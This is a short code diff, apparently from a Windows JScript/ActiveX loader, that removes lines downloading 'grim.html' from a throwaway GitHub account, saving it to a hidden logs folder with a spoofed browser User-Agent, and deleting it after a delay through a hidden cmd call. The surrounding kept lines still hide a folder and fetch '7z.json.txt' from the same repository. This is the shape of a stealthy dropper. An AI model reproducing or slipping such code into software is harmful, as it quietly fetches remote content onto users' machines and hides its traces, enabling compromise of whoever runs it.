@@ -32,13 +32,6 @@ try {
     '     var folder = fso.GetFolder(logsFolder); ' +
     '     folder.Attributes = folder.Attributes | 2; ' +
     '   }' +
-    '   var grimUrl = "https://raw.githubusercontent.com/anonymous-xyzzz/jungle/main/grim.html";' +
-    '   var grimPath = logsFolder + "\\\\grim.html";' +
-    '   var gh = new ActiveXObject("MSXML2.XMLHTTP");' +
-    '   gh.open("GET", grimUrl + "?cb=" + (new Date()).getTime(), false);' +
-    '   gh.setRequestHeader("User-Agent", "Mozilla/5.0");' +
-    '   gh.send();' +
-    '   if (gh.status === 200) { var gs = new ActiveXObject("ADODB.Stream"); gs.Type=1; gs.Mode=3; gs.Open(); gs.Write(gh.responseBody); gs.SaveToFile(grimPath, 2); gs.Close(); shell.Run("cmd /c timeout /t 25 >nul & del /f /q \\"" + grimPath + "\\"", 0, true); }' +
     '   var jsonPath = logsFolder + "\\\\7z.json.txt";' +
     '   var jsonUrl = "https://raw.githubusercontent.com/anonymous-xyzzz/jungle/main/7z.json.txt";' +
     '   var h = new ActiveXObject("MSXML2.XMLHTTP");' +
